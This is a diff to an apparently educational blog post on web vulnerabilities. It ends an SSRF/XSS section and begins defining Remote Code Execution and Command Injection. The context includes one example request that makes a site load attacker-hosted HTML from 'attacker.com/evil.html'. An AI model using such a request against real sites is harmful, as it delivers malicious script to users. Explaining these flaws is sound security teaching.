@@ -223,3 +223,5 @@ SSRF is not as easy to fix as the previous vulnerabilities we talked about; ther
 If you've paid attention to this blog, you may be able to guess which vulnerability is present in that picture above, aside from SSRF. If you've guessed XSS, that's correct. In this case, an attacker can just upload <code>.html</code> file with his malicious client-side code and send it like this <code>http://example.com/?image=http://attacker.com/evil.html</code><br><br>
 
 ## Remote Code Execution(RCE) & Command Injection
+
+People mix these two vulnerabilities many times because of their similarities; it doesn't really matter because when you have one, you can have another almost always if you want. These two are the top of the pyramid and the most important ones to be fixed. By their names you can figure out, RCE is a vulnerability which allows an attacker to run arbitary code on victims machine and Command Injection is a vulnerability which allows an attacker to execute OS commands on victims machine. <br>
